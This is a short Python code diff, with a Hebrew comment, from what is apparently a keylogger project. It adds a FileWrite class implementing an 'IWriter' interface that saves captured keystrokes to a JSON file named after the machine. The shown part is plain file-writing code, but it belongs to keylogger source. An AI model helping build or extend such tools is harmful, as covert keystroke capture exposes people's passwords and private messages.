@@ -1,13 +1,16 @@
 import json
 import os
+from Ikeylogger import IWriter
 
 # --הגדרת מיקום שמירת הקובץ--
-os.chdir(os.getcwd()+"\\data")
+os.chdir(os.getcwd() + "\\data")
 
-def json_time(time,key):
-    with open(f"{time}.json", "w") as file:
-        keys = []
-        for k in key:
-            keys.append(k)
 
-        json.dump(keys, file)
+class FileWrite(IWriter):
+    def send_data(self, data, machine_name):
+        with open(f"{machine_name}.json", "w") as file:
+            keys = []
+            for key in data:
+                keys.append(key)
+
+            json.dump(keys, file)
